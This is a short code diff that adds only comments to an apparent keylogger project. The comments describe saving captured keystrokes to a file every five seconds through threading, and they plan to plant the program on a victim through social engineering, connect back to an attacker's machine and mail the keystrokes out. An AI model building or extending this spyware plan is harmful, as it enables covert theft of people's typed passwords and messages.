@@ -1,0 +1,8 @@
+ # the major issue with this program is saving the log because you cant save it when the program stop
+ # this is because you wont be able to access the log variable
+ # the only way is to use threading , the report fuction is called as soon as the program start
+ # it  write the key_logged to a file every 5 sec even as the program runs. 
+#further ugrade will b to:		
+#send the program to a remote server using social engineer or any file upload
+#the program create a connection with the attacker machine
+# send key_logged as mail back to the attacker
